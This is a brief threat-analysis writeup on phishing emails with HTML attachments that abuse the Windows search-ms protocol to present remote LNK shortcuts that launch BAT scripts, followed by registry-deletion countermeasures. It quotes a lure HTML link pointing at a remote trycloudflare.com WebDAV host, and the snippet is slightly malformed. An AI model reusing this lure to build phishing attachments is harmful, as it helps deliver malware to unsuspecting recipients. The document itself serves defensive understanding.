- HTML attachments that abuse the Windows search protocol (search-ms URI) to push batch files hosted on remote servers that deliver malware.
- Windows Search protocol is a Uniform Resource Identifier (URI) that enables applications to open Windows Explorer to perform searches using specific parameters.

### Steps in the exploit
1. Victim receives an email with a zip file.
2. Zip file contains a HTML attachment disguised as an invoice document.
3. HTML file has the following tag which causes the browser to automatically open a malicious URL.
```HTML
<meta http-equiv= "refresh">
```
4. If the browser blocks this, an alternative clickable link is available on the webpage for the user to click.
5. The URL causes the windows search protocol to perform a search on a remote host using the following parameters
	1. Query: Searches for items labeled "INVOICE."
	2. Crumb: Specifies the search scope, pointing to a malicious server via Cloudflare.
	3. Displayname: Renames the search display to "Downloads" to mimic a legitimate interface.
	4. Location: Uses Cloudflare's tunneling service to mask the server, making it look legitimate by presenting remote resources as local files.
```HTML
<ps><a href= "search: query= INVOICE&amp; crumb=location:\\tender-coding-bi-associate.trycloudflare.com@SSL \DavWWWRoot\google\INVOICE&amp; displayname ></a></p>
```
6. Search retrieves a single LNK file hosted on the remote server pointing to a BAT script.
7. If victim clicks on the shortcut, the script runs on the local machine.


### Suggested countermeasures
- Deleting registry entries associated with the search-ms/search URI protocol
```
reg delete HKEY_CLASSES_ROOT\search /f
reg delete HKEY_CLASSES_ROOT\search-ms /f
```


